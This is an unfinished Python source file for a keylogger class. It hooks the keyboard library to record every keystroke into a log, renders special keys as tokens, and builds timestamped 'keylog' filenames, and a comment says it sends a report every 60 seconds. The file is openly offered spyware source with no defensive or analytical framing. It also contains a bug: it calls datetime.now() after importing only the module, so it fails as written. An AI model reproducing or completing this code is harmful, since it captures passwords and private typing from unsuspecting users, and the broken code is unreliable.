from threading import Timer
import keyboard
import datetime

REPORT_TIMER = 60 # Will create and send a report every 60 seconds, time can be changed

class KeyLogger:
    def __init__(self, time_interval, report_method="file"):
        
        self.time_interval = time_interval
        self.report_method = report_method

        self.log = ""

        self.start_time = datetime.now()
        self.end_time = datetime.now()

    def callback(self, event):
        name = event.name

        if len(name) > 1:
            # A special key is pressed
            if name == "space":
                name = " "

            elif name == "enter":
                name = "[ENTER]\n"

            elif name == "decimal":
                name = "."

            else:
                name = name.replace(" ", "_") # Replacing all spaces with underscores
                name = f"[{name.upper()}]" # Uppercasing the keys pressed
    
        self.log += name # Add keystroke to the log

    def update_filename(self):
        start_time_str = str(self.start_time)[:-7].replace(" ", "-").replace(":", "")
        end_time_str = str(self.end_time)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_time_str}_{end_time_str}"

            
